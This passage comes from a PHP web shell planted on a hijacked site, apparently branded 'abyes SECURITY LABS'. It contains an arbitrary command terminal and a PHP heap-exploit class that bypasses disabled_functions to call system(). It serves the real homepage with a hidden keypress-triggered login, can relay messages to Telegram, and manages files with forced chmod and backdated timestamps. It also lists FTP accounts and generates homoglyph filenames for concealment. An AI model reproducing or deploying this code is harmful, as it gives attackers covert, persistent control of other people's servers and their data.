        $sse('done', array('cwd' => $cwd, 'sid' => $sessId));
        exit;
    }

    if ($lockAction === 'terminal_exec') {
        $cmd     = isset($_POST['cmd'])  ? trim($_POST['cmd'])  : '';
        $cwd     = isset($_POST['cwd'])  ? trim($_POST['cwd'])  : dirname(__FILE__);
        $sessId  = isset($_POST['sid'])  ? preg_replace('/[^a-zA-Z0-9_-]/', '', $_POST['sid']) : '';
        if (empty($cwd) || !is_dir($cwd)) $cwd = dirname(__FILE__);
        $sessDir = getDataPath('.term_sessions');
        if (!is_dir($sessDir)) @mkdir($sessDir, 0755, true);
        $cwdFile = $sessDir . '/' . $sessId . '.cwd';
        if ($sessId && file_exists($cwdFile)) {
            $cwd = trim(@file_get_contents($cwdFile)) ?: $cwd;
        }
        if ($cmd === '' || $cmd === null) { echo json_encode(['cwd'=>$cwd,'out'=>'']); exit; }
        if (preg_match('/^cd(?:\s+(.*))?$/', $cmd, $m)) {
            $tgt = isset($m[1]) ? trim($m[1]) : '';
            if ($tgt === '' || $tgt === '~') $tgt = getenv('HOME') ?: '/';
            elseif ($tgt[0] !== '/') $tgt = realpath($cwd . '/' . $tgt) ?: ($cwd . '/' . $tgt);
            if (is_dir($tgt)) {
                $cwd = rtrim(realpath($tgt), '/') ?: $tgt;
                if ($sessId) @file_put_contents($cwdFile, $cwd);
                echo json_encode(['cwd'=>$cwd,'out'=>'']); exit;
            }
            echo json_encode(['cwd'=>$cwd,'out'=>"bash: cd: $tgt: No such file or directory"]); exit;
        }
        if (!$sessId) {
            $sessId = 'lp_' . bin2hex(random_bytes(6));
            $cwdFile = $sessDir . '/' . $sessId . '.cwd';
            @file_put_contents($cwdFile, $cwd);
        }
        $env = ['TERM'=>'xterm-256color','HOME'=>getenv('HOME')?:'/tmp','PATH'=>getenv('PATH')?:'/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin','COLUMNS'=>'180','LINES'=>'50'];
        $out = '';
        $fullCmd = 'cd ' . escapeshellarg($cwd) . ' && (' . $cmd . ') 2>&1';
        if (function_exists('proc_open')) {
            $desc = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
            $proc = @proc_open('/bin/bash -c ' . escapeshellarg($fullCmd), $desc, $pipes, $cwd, $env);
            if ($proc) {
                fclose($pipes[0]);
                stream_set_blocking($pipes[1], false);
                stream_set_blocking($pipes[2], false);
                $deadline = time() + 60;
                while (time() < $deadline) {
                    $r = [$pipes[1],$pipes[2]]; $w=[]; $e=[];
                    if (@stream_select($r,$w,$e,0,80000) > 0) {
                        foreach ($r as $p) { $c = @fread($p,8192); if ($c!==false&&$c!=='') $out.=$c; }
                    }
                    if (feof($pipes[1])&&feof($pipes[2])) break;
                }
                @fclose($pipes[1]); @fclose($pipes[2]); proc_close($proc);
            }
        } elseif (function_exists('shell_exec')) {
            $out = (string)@shell_exec($fullCmd);
        } elseif (function_exists('exec')) {
            @exec($fullCmd, $lines); $out = implode("\n", $lines);
        } elseif (function_exists('passthru')) {
            ob_start(); @passthru($fullCmd); $out = ob_get_clean();
        }
        $newCwdRaw = @shell_exec('cd ' . escapeshellarg($cwd) . ' && bash -c ' . escapeshellarg($cmd . '; pwd 2>/dev/null') . ' 2>/dev/null | tail -1');
        if ($newCwdRaw && is_dir(trim($newCwdRaw))) $cwd = trim($newCwdRaw);
        if ($sessId) @file_put_contents($cwdFile, $cwd);
        echo json_encode(['cwd'=>$cwd,'out'=>$out,'sid'=>$sessId]); exit;
    }

    echo json_encode(array('err' => 'Unknown lock_action')); exit;
}



function lp_tg_settings_file() {
    return getDataPath('.tg_settings');
}

function lp_tg_settings_load() {
    $f = lp_tg_settings_file();
    if (!file_exists($f)) return array('bot_token' => '', 'chat_id' => '');
    $raw = @file_get_contents($f);
    $d   = @json_decode($raw, true);
    return is_array($d) ? $d : array('bot_token' => '', 'chat_id' => '');
}

function lp_tg_settings_save($token, $chatId) {
    $f = lp_tg_settings_file();
    @mkdir(dirname($f), 0755, true);
    @file_put_contents($f, json_encode(array('bot_token' => $token, 'chat_id' => $chatId)));
}

function lp_telegram_send($token, $chatId, $text) {
    if (empty($token) || empty($chatId)) return false;
    $url  = 'https://api.telegram.org/bot' . $token . '/sendMessage';
    $post = json_encode(array('chat_id' => $chatId, 'text' => $text, 'parse_mode' => 'HTML', 'disable_web_page_preview' => false));
    $resp = '';
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, array(
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $post,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 10,
            CURLOPT_HTTPHEADER     => array('Content-Type: application/json'),
            CURLOPT_SSL_VERIFYPEER => false,
        ));
        $resp = curl_exec($ch); curl_close($ch);
    } else {
        $ctx  = stream_context_create(array('http' => array(
            'method'  => 'POST',
            'header'  => "Content-Type: application/json\r\n",
            'content' => $post,
            'timeout' => 10,
            'ignore_errors' => true,
        )));
        $resp = @file_get_contents($url, false, $ctx);
    }
    $j = @json_decode($resp, true);
    return isset($j['ok']) && $j['ok'];
}

function lp_get_page_url() {
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host   = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    $uri    = $_SERVER['SCRIPT_NAME'] ?? $_SERVER['PHP_SELF'] ?? '/';
    return $scheme . '://' . $host . $uri;
}


function lp_get_home_url() {
    $scheme = ((!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http');
    $host = $_SERVER['HTTP_HOST'] ?? $_SERVER['SERVER_NAME'] ?? 'localhost';
    return $scheme . '://' . $host . '/';
}


function lp_file_baseline($path) {
    if (!file_exists($path) || is_dir($path)) return array('size' => 0, 'hash' => '');
    $size = @filesize($path);
    $hash = @md5_file($path);
    return array('size' => $size ?: 0, 'hash' => $hash ?: '');
}

function lp_file_changed($path, $baseline) {
    if (!is_array($baseline)) $baseline = array('size' => 0, 'hash' => '');
    if (!file_exists($path)) return true; // missing = changed
    $cur = lp_file_baseline($path);
    return ($cur['size'] !== $baseline['size'] || $cur['hash'] !== $baseline['hash']);
}

function lp_ensure_parent_writable($path) {
    $dir = dirname($path);
    if (!is_dir($dir)) return false;
    if (is_writable($dir)) return true;
    if (@chmod($dir, 0755)) return true;
    if (@chmod($dir, 0777)) return true;
    return false; // Could not make writable
}


function fetchHomepage() {
    $homeUrl = lp_get_home_url();
    
    $ctx = @stream_context_create([
        'http' => [
            'method' => 'GET',
            'header' => "User-Agent: Mozilla/5.0\r\nAccept: text/html\r\n",
            'timeout' => 10,
            'ignore_errors' => true,
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false]
    ]);
    
    $homepage = @file_get_contents($homeUrl, false, $ctx);
    if ($homepage !== false && strlen($homepage) > 100) return $homepage;
    
    if (function_exists('curl_init')) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $homeUrl,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT => 10,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $homepage = curl_exec($ch);
        curl_close($ch);
        if ($homepage !== false && strlen($homepage) > 100) return $homepage;
    }
    
    return null;
}


if (!isAuthenticated()) {
    if (!$SECRET_PARAM) {
        $homepage = fetchHomepage();
        if ($homepage !== null) {
            echo $homepage;
            exit;
        }
        header('Location: /');
        exit;
    }
    
    if (isset($_GET['password']) && !empty($_GET['password'])) {
        if (authenticate($_GET['password'])) {
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
            $scriptName = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
            header('Location: ' . $scheme . '://' . $host . $scriptName . '?_xk=labs');
            exit;
        }
    }
    
    $loginError = '';
    if (isset($_POST['login_password'])) {
        if (authenticate($_POST['login_password'])) {
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
            $scriptName = isset($_SERVER['SCRIPT_NAME']) ? $_SERVER['SCRIPT_NAME'] : '';
            header('Location: ' . $scheme . '://' . $host . $scriptName . '?_xk=labs');
            exit;
        } else {
            $loginError = 'Invalid password';
        }
    }
    
    $homepage = fetchHomepage();
    if ($homepage !== null) {
        $loginForm = '
<style>
#_lp_overlay{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.92);backdrop-filter:blur(8px);z-index:999999;justify-content:center;align-items:center;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
#_lp_overlay.show{display:flex}
#_lp_box{background:linear-gradient(145deg,#1a1a2e,#0d0d1a);padding:32px;border-radius:16px;border:1px solid rgba(255,215,0,0.2);box-shadow:0 25px 80px rgba(0,0,0,0.6),0 0 60px rgba(255,215,0,0.08);max-width:380px;width:90%;text-align:center}
#_lp_box h3{color:#ffd700;margin:0 0 6px;font-size:22px;font-weight:700}
#_lp_box p{color:#666;margin:0 0 24px;font-size:12px}
#_lp_box label{display:block;text-align:left;color:#888;font-size:11px;margin-bottom:6px;font-weight:500}
#_lp_box input{width:100%;padding:12px 14px;background:rgba(0,0,0,0.5);border:1px solid rgba(255,255,255,0.1);color:#fff;border-radius:8px;font-size:14px;outline:none;box-sizing:border-box;transition:border-color 0.2s}
#_lp_box input:focus{border-color:#ffd700}
#_lp_box button{width:100%;padding:12px;background:linear-gradient(135deg,#ffd700,#ff8c00);border:none;border-radius:8px;color:#000;font-weight:700;font-size:14px;cursor:pointer;margin-top:16px;transition:transform 0.2s,box-shadow 0.2s}
#_lp_box button:hover{transform:translateY(-2px);box-shadow:0 6px 25px rgba(255,215,0,0.4)}
#_lp_box .hint{color:#444;font-size:10px;margin-top:16px}
#_lp_err{background:rgba(248,81,73,0.15);border:1px solid rgba(248,81,73,0.3);color:#f85149;padding:10px;border-radius:6px;margin-bottom:16px;font-size:12px}
</style>
<div id="_lp_overlay">
<form id="_lp_box" method="POST">
<h3>abyes SECURITY LABS</h3>
<p>Authentication Required</p>
' . ($loginError ? '<div id="_lp_err">' . htmlspecialchars($loginError) . '</div>' : '') . '
<label>Password</label>
<input type="password" name="login_password" id="_lp_pwd" placeholder="Enter password" required autocomplete="off">
<button type="submit">GASS</button>
<div class="hint">Press ESC to close</div>
</form>
</div>
<script>
document.addEventListener("keydown",function(e){
if(e.key==="p"||e.key==="P"){var o=document.getElementById("_lp_overlay");if(o){o.classList.toggle("show");if(o.classList.contains("show"))document.getElementById("_lp_pwd").focus();}}
if(e.key==="Escape"){var o=document.getElementById("_lp_overlay");if(o)o.classList.remove("show");}
});
</script>';
        $homepage = str_replace('</body>', $loginForm . '</body>', $homepage);
        echo $homepage;
        exit;
    }
    
    header('Location: /');
    exit;
}


$justLoggedIn = !isset($_SESSION['fbi_played']);
if ($justLoggedIn) { $_SESSION['fbi_played'] = true; }

if (isset($_POST['logout'])) {
    logout();
    header('Location: ' . $_SERVER['SCRIPT_NAME']);
    exit;
}

@ob_clean();
@header("X-Accel-Buffering: no");
@header("Content-Encoding: none");


class Helper { public $a, $b, $c; }
class Pwn {
    const LOGGING = false;
    const CHUNK_DATA_SIZE = 0x60;
    const CHUNK_SIZE = self::CHUNK_DATA_SIZE;
    const STRING_SIZE = self::CHUNK_DATA_SIZE - 0x18 - 1;
    const HT_SIZE = 0x118;
    const HT_STRING_SIZE = self::HT_SIZE - 0x18 - 1;

    public function __construct($cmd) {
        for($i = 0; $i < 10; $i++) {
            $groom[] = self::alloc(self::STRING_SIZE);
            $groom[] = self::alloc(self::HT_STRING_SIZE);
        }
        $concat_str_addr = self::str2ptr($this->heap_leak(), 16);
        $fill = self::alloc(self::STRING_SIZE);
        $this->abc = self::alloc(self::STRING_SIZE);
        $abc_addr = $concat_str_addr + self::CHUNK_SIZE;
        $this->free($abc_addr);
        $this->helper = new Helper;
        if(strlen($this->abc) < 0x1337) return;
        $this->helper->a = "leet";
        $this->helper->b = function($x) {};
        $this->helper->c = 0xfeedface;
        $helper_handlers = $this->rel_read(0);
        $closure_addr = $this->rel_read(0x20);
        $closure_ce = $this->read($closure_addr + 0x10);
        $basic_funcs = $this->get_basic_funcs($closure_ce);
        $zif_system = $this->get_system($basic_funcs);
        $fake_closure_off = 0x70;
        for($i = 0; $i < 0x138; $i += 8) {
            $this->rel_write($fake_closure_off + $i, $this->read($closure_addr + $i));
        }
        $this->rel_write($fake_closure_off + 0x38, 1, 4);
        $handler_offset = PHP_MAJOR_VERSION === 8 ? 0x70 : 0x68;
        $this->rel_write($fake_closure_off + $handler_offset, $zif_system);
        $fake_closure_addr = $abc_addr + $fake_closure_off + 0x18;
        $this->rel_write(0x20, $fake_closure_addr);
        ($this->helper->b)($cmd);
        $this->rel_write(0x20, $closure_addr);
        unset($this->helper->b);
    }
    private function heap_leak() {
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf) {
            $arr = 1;
            $buf = str_repeat("\x00", self::HT_STRING_SIZE);
        });
        $arr[1] .= self::alloc(self::STRING_SIZE - strlen("Array"));
        return $buf;
    }
    private function free($addr) {
        $payload = pack("Q*", 0xdeadbeef, 0xcafebabe, $addr);
        $payload .= str_repeat("A", self::HT_STRING_SIZE - strlen($payload));
        $arr = [[], []];
        set_error_handler(function() use (&$arr, &$buf, &$payload) {
            $arr = 1;
            $buf = str_repeat($payload, 1);
        });
        $arr[1] .= "x";
    }
    private function rel_read($offset) { return self::str2ptr($this->abc, $offset); }
    private function rel_write($offset, $value, $n = 8) {
        for ($i = 0; $i < $n; $i++) {
            $this->abc[$offset + $i] = chr($value & 0xff);
            $value >>= 8;
        }
    }
    private function read($addr, $n = 8) {
        $this->rel_write(0x10, $addr - 0x10);
        $value = strlen($this->helper->a);
        if($n !== 8) { $value &= (1 << ($n << 3)) - 1; }
        return $value;
    }
    private function get_system($basic_funcs) {
        $addr = $basic_funcs;
        do {
            $f_entry = $this->read($addr);
            $f_name = $this->read($f_entry, 6);
            if($f_name === 0x6d6574737973) return $this->read($addr + 8);
            $addr += 0x20;
        } while($f_entry !== 0);
    }
    private function get_basic_funcs($addr) {
        while(true) {
            $addr -= 0x10;
            if($this->read($addr, 4) === 0xA8 &&
                in_array($this->read($addr + 4, 4), [20180731, 20190902, 20200930, 20210902])) {
                $module_name_addr = $this->read($addr + 0x20);
                $module_name = $this->read($module_name_addr);
                if($module_name === 0x647261646e617473) return $this->read($addr + 0x28);
            }
        }
    }
    static function alloc($size) { return str_shuffle(str_repeat("A", $size)); }
    static function str2ptr($str, $p = 0, $n = 8) {
        $address = 0;
        for($j = $n - 1; $j >= 0; $j--) { $address <<= 8; $address |= ord($str[$p + $j]); }
        return $address;
    }
}

function runBypass($cmd) {
    ob_start();
    try { new Pwn($cmd); } catch(\Throwable $e) {}
    $out = ob_get_clean();
    return (!empty(trim($out ?? ''))) ? trim($out) : null;
}


function isWindows() {
    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
}

function runCmd($cmd) {
    $out = null;
    $isWin = isWindows();
    
    if ($isWin) {
        $fullCmd = $cmd . ' 2>&1';
        if (function_exists('proc_open')) {
            $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
            $proc = @proc_open('cmd /c ' . $cmd, $desc, $pipes, getcwd());
            if (is_resource($proc)) {
                @fclose($pipes[0]);
                $out = @stream_get_contents($pipes[1]);
                $err = @stream_get_contents($pipes[2]);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($proc);
                if (empty(trim($out ? $out : '')) && !empty(trim($err ? $err : ''))) $out = $err;
            }
        }
        if ($out === null && function_exists('exec')) {
            @exec($fullCmd, $outArr, $ret);
            $out = implode("\n", $outArr);
        }
        if ($out === null && function_exists('shell_exec')) {
            $out = @shell_exec($fullCmd);
        }
        if ($out === null && function_exists('popen')) {
            $fp = @popen($fullCmd, 'r');
            if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
        }
    } else {
        $user = get_current_user();
        $home = getenv('HOME') ? getenv('HOME') : ('/home/' . $user);
        $env = "HOME=$home USER=$user";
        $fullCmd = $env . ' /bin/bash -l -c ' . escapeshellarg($cmd) . ' 2>&1';
        if (function_exists('proc_open')) {
            $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
            $envArr = array('HOME' => $home, 'USER' => $user, 'PATH' => '/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin');
            $proc = @proc_open('/bin/bash -l -c ' . escapeshellarg($cmd), $desc, $pipes, $home, $envArr);
            if (is_resource($proc)) {
                @fclose($pipes[0]);
                $out = @stream_get_contents($pipes[1]);
                $err = @stream_get_contents($pipes[2]);
                @fclose($pipes[1]);
                @fclose($pipes[2]);
                @proc_close($proc);
                if (empty(trim($out ? $out : '')) && !empty(trim($err ? $err : ''))) $out = $err;
            }
        }
        if ($out === null && function_exists('exec')) {
            @exec($fullCmd, $outArr, $ret);
            $out = implode("\n", $outArr);
        }
        if ($out === null && function_exists('shell_exec')) {
            $out = @shell_exec($fullCmd);
        }
        if ($out === null && function_exists('popen')) {
            $fp = @popen($fullCmd, 'r');
            if ($fp) { $out = @stream_get_contents($fp); @pclose($fp); }
        }
        if ($out === null || trim($out) === '') {
            $out = runBypass($cmd);
        }
    }
    return $out;
}

function runUapi($args) {
    return runCmd('uapi ' . $args);
}

function parseUapiStatus($raw) {
    if (empty($raw)) return ['ok' => false, 'raw' => ''];
    $ok = (bool)preg_match('/status:\s*1/', $raw);
    return ['ok' => $ok, 'raw' => $raw];
}

function parseUapiFtpList($raw) {
    if (empty($raw)) return [];
    $accounts = [];
    $blocks = preg_split('/^\s*-\s*$/m', $raw);
    foreach ($blocks as $block) {
        $acct = [];
        if (preg_match('/\buser:\s*(.+)/i', $block, $m)) $acct['user'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\blogin:\s*(.+)/i', $block, $m)) $acct['login'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdomain:\s*(.+)/i', $block, $m)) $acct['domain'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bhomedir:\s*(.+)/i', $block, $m)) $acct['homedir'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdiskquota:\s*(.+)/i', $block, $m)) $acct['quota'] = trim($m[1], " '\"\r\n");
        if (preg_match('/\bdiskused:\s*(.+)/i', $block, $m)) $acct['used'] = trim($m[1], " '\"\r\n");
        if (!empty($acct['user']) || !empty($acct['login'])) $accounts[] = $acct;
    }
    if (empty($accounts)) {
        preg_match_all('/(?:user|login):\s*[\'"]?(\S+)[\'"]?/i', $raw, $userMatches);
        preg_match_all('/domain:\s*[\'"]?(\S+)[\'"]?/i', $raw, $domainMatches);
        preg_match_all('/homedir:\s*[\'"]?(\S+)[\'"]?/i', $raw, $dirMatches);
        for ($i = 0; $i < count($userMatches[1]); $i++) {
            $accounts[] = [
                'user' => $userMatches[1][$i] ?? '',
                'login' => $userMatches[1][$i] ?? '',
                'domain' => $domainMatches[1][$i] ?? '',
                'homedir' => $dirMatches[1][$i] ?? '',
            ];
        }
    }
    return $accounts;
}

function formatSize($size) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($size >= 1024 && $i < 4) { $size /= 1024; $i++; }
    return round($size, 2) . ' ' . $units[$i];
}

function fixPermission($path) {
    $perms = @fileperms($path);
    if ($perms === false) return false;
    $octal = substr(sprintf('%o', $perms), -4);
    $unwritable = ['0555','0444','0111','0000','0550','0440','0110','0554','0445','0511','0155','0144'];
    if (in_array($octal, $unwritable)) {
        if (is_dir($path)) {
            @chmod($path, 0755);
        } else {
            @chmod($path, 0644);
        }
        return true;
    }
    return false;
}

function safeAccess($path) {
    fixPermission($path);
    return @is_readable($path);
}

function getFileDetails($path) {
    $folders = [];
    $files = [];
    try {
        if (!safeAccess($path)) return 'None';
        $items = @scandir($path);
        if (!is_array($items)) return 'None';
        foreach ($items as $item) {
            if ($item == '.' || $item == '..') continue;
            $itemPath = $path . '/' . $item;
            $perm = @fileperms($itemPath);
            $permStr = $perm !== false ? substr(sprintf('%o', $perm), -4) : '----';
            $size = '';
            if (!is_dir($itemPath)) {
                $s = @filesize($itemPath);
                $size = $s !== false ? formatSize($s) : '?';
            }
            $isWritable = @is_writable($itemPath);
            $isReadable = @is_readable($itemPath);
            $permColor = '#f85149';
            if ($isWritable && $isReadable) $permColor = '#3fb950';
            elseif ($isReadable) $permColor = '#e6edf3';
            $mtime = @filemtime($itemPath);
            $isDir = is_dir($itemPath);
            $ext   = $isDir ? '' : strtolower(pathinfo($item, PATHINFO_EXTENSION));
            $detail = [
                'name' => $item,
                'type' => $isDir ? 'Folder' : 'File',
                'size' => $size,
                'permission' => $permStr,
                'perm_color' => $permColor,
                'writable' => $isWritable,
                'readable' => $isReadable,
                'mtime' => $mtime !== false ? $mtime : 0,
                'ext'   => $ext,
                'size_raw' => $isDir ? 0 : (@filesize($itemPath) ?: 0),
            ];
            if ($isDir) $folders[] = $detail;
            else $files[] = $detail;
        }

        $sort = isset($_GET['sort']) ? $_GET['sort'] : 'ext';
        $dir  = isset($_GET['dir'])  ? $_GET['dir']  : 'asc';

        $sortFn = function($a, $b) use ($sort, $dir) {
            $cmp = 0;
            switch ($sort) {
                case 'ext':
                    $aIsDir = $a['type'] === 'Folder' ? 0 : 1;
                    $bIsDir = $b['type'] === 'Folder' ? 0 : 1;
                    if ($aIsDir !== $bIsDir) return $aIsDir - $bIsDir;
                    $cmp = strcmp($a['ext'], $b['ext']);
                    if ($cmp === 0) $cmp = strnatcasecmp($a['name'], $b['name']);
                    break;
                case 'mtime':
                    $cmp = $a['mtime'] <=> $b['mtime'];
                    if ($cmp === 0) $cmp = strnatcasecmp($a['name'], $b['name']);
                    break;
                case 'size':
                    $cmp = $a['size_raw'] <=> $b['size_raw'];
                    if ($cmp === 0) $cmp = strnatcasecmp($a['name'], $b['name']);
                    break;
                case 'perm':
                    $cmp = strcmp((string)$a['permission'], (string)$b['permission']);
                    if ($cmp === 0) $cmp = strnatcasecmp($a['name'], $b['name']);
                    break;
                case 'name':
                default:
                    $cmp = strnatcasecmp($a['name'], $b['name']);
                    break;
            }
            return $dir === 'desc' ? -$cmp : $cmp;
        };

        if ($sort === 'ext') {
            $all = array_merge($folders, $files);
            usort($all, $sortFn);
            return $all;
        }

        usort($folders, $sortFn);
        usort($files,   $sortFn);
        return array_merge($folders, $files);
    } catch (Exception $e) {
        return 'None';
    }
}

function executeCommand($command) {
    $currentDirectory = getCurrentDirectory();
    $fullCmd = "cd " . escapeshellarg($currentDirectory) . " && " . $command;
    $out = runCmd($fullCmd);
    if ($out !== null && !empty(trim($out))) return trim($out);
    $out = runBypass($command);
    if ($out !== null && !empty(trim($out))) return trim($out);
    return 'No output or command failed.';
}

function readFileContent($file) { return @file_get_contents($file); }

function saveFileContent($file) {
    if (isset($_POST['content'])) {
        fixPermission($file);
        fixPermission(dirname($file));
        return @file_put_contents($file, $_POST['content']) !== false;
    }
    return false;
}

function getFileUrl($filePath) {
    $docRoot = isset($_SERVER['DOCUMENT_ROOT']) ? rtrim($_SERVER['DOCUMENT_ROOT'], '/') : '';
    $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
    $host = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : (isset($_SERVER['SERVER_NAME']) ? $_SERVER['SERVER_NAME'] : 'localhost');
    $realPath = realpath($filePath);
    if ($realPath && $docRoot && strpos($realPath, $docRoot) === 0) {
        $relativePath = substr($realPath, strlen($docRoot));
        return $scheme . '://' . $host . $relativePath;
    }
    return null;
}

function uploadFile($targetDirectory) {
    if (isset($_FILES['file'])) {
        fixPermission($targetDirectory);
        $targetFile = $targetDirectory . '/' . basename($_FILES['file']['name']);
        if ($_FILES['file']['size'] === 0) return 'Empty file.';
        if (move_uploaded_file($_FILES['file']['tmp_name'], $targetFile)) {
            $ts = randomOldTimestamp(); @touch($targetFile, $ts, $ts);
            $realPath = realpath($targetFile);
            $url = getFileUrl($targetFile);
            $msg = '<strong style="color:#3fb950;">File Uploaded!</strong><br>';
            $msg .= '<span style="color:var(--text-muted);font-size:11px;">Path:</span> <code style="background:rgba(0,0,0,0.3);padding:2px 6px;border-radius:3px;font-size:11px;">' . htmlspecialchars($realPath ? $realPath : $targetFile) . '</code>';
            if ($url) {
                $msg .= '<br><span style="color:var(--text-muted);font-size:11px;">Link:</span> <a href="' . htmlspecialchars($url) . '" target="_blank" style="color:#00d4ff;font-size:11px;word-break:break-all;">' . htmlspecialchars($url) . '</a>';
            }
            return $msg;
        }
        return 'Error uploading file.';
    }
    return '';
}

function uploadMultipleFiles($targetDirectory) {
    if (!isset($_FILES['files'])) return 'No files selected.';
    fixPermission($targetDirectory);
    $success = 0; $fail = 0;
    $uploadedFiles = array();
    for ($i = 0; $i < count($_FILES['files']['name']); $i++) {
        if ($_FILES['files']['error'][$i] === 0 && !empty($_FILES['files']['name'][$i])) {
            $target = $targetDirectory . '/' . basename($_FILES['files']['name'][$i]);
            if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $target)) {
                $ts = randomOldTimestamp(); @touch($target, $ts, $ts);
                $success++;
                $realPath = realpath($target);
                $url = getFileUrl($target);
                $uploadedFiles[] = array('path' => $realPath ? $realPath : $target, 'url' => $url, 'name' => basename($_FILES['files']['name'][$i]));
            }
            else $fail++;
        }
    }
    if ($success > 0) {
        $msg = '<strong style="color:#3fb950;">Files Uploaded!</strong> (' . $success . ' success, ' . $fail . ' failed)<br>';
        foreach ($uploadedFiles as $uf) {
            $msg .= '<div style="margin-top:6px;padding:6px 8px;background:rgba(0,0,0,0.2);border-radius:4px;font-size:11px;">';
            $msg .= '<span style="color:#3fb950;font-weight:600;">' . htmlspecialchars($uf['name']) . '</span><br>';
            $msg .= '<span style="color:var(--text-muted);">Path:</span> <code style="background:rgba(0,0,0,0.3);padding:1px 4px;border-radius:2px;font-size:10px;">' . htmlspecialchars($uf['path']) . '</code>';
            if ($uf['url']) {
                $msg .= '<br><span style="color:var(--text-muted);">Link:</span> <a href="' . htmlspecialchars($uf['url']) . '" target="_blank" style="color:#00d4ff;font-size:10px;word-break:break-all;">' . htmlspecialchars($uf['url']) . '</a>';
            }
            $msg .= '</div>';
        }
        return $msg;
    }
    return "Uploaded: $success, Failed: $fail";
}

function getCurrentDirectory() { return realpath(getcwd()); }

function deleteFile($file) {
    fixPermission($file);
    fixPermission(dirname($file));
    if (file_exists($file)) {
        if (is_dir($file)) return deleteFolder($file);
        if (@unlink($file)) return true;
    }
    return false;
}

function deleteFolder($folder) {
    fixPermission($folder);
    if (is_dir($folder)) {
        $items = @scandir($folder);
        if (is_array($items)) {
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                $path = $folder . '/' . $item;
                fixPermission($path);
                if (is_dir($path)) deleteFolder($path);
                else @unlink($path);
            }
        }
        return @rmdir($folder);
    }
    return false;
}

function renameFile($oldName, $newName) {
    fixPermission($oldName);
    fixPermission(dirname($oldName));
    if (file_exists($oldName)) {
        $directory = dirname($oldName);
        $newPath = $directory . '/' . $newName;
        if (@rename($oldName, $newPath)) return 'Renamed successfully.';
        return 'Error renaming.';
    }
    return 'File does not exist.';
}

function scanDeepestDirectory($basePath) {
    $deepest = []; $maxDepth = 0;
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
            RecursiveIteratorIterator::SELF_FIRST
        );
        foreach ($iterator as $item) {
            if ($item->isDir()) {
                $depth = $iterator->getDepth();
                if ($depth > $maxDepth) { $maxDepth = $depth; $deepest = [$item->getPathname()]; }
                elseif ($depth == $maxDepth) { $deepest[] = $item->getPathname(); }
            }
        }
    } catch (Exception $e) {}
    return $deepest;
}

function scanNewlyFiles($basePath, $ext = 'php', $limit = 50) {
    $files = [];
    try {
        $iterator = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS)
        );
        foreach ($iterator as $item) {
            if ($item->isFile() && strtolower($item->getExtension()) === $ext) {
                $files[] = ['path' => $item->getPathname(), 'time' => $item->getMTime()];
            }
        }
    } catch (Exception $e) {}
    usort($files, function($a, $b) { return $b['time'] - $a['time']; });
    return array_slice($files, 0, $limit);
}

function generateHomoglyph($filename) {
    $name = pathinfo($filename, PATHINFO_FILENAME);
    $ext = pathinfo($filename, PATHINFO_EXTENSION);
    $map = [
        'a' => ['@','4'],
        'e' => ['3'],
        'i' => ['1','l'],
        'o' => ['0'],
        's' => ['5'],
        'l' => ['1','I'],
        'g' => ['9'],
        'c' => ['('],
        't' => ['7'],
        'I' => ['l','1'],
        'O' => ['0'],
        'S' => ['5'],
        'A' => ['4','@'],
        'E' => ['3'],
        'B' => ['8'],
        'G' => ['6'],
        'T' => ['7'],
    ];
    $variants = [];
    $len = strlen($name);
    for ($i = 0; $i < $len; $i++) {
        $ch = $name[$i];
        if (isset($map[$ch])) {
            foreach ($map[$ch] as $rep) {
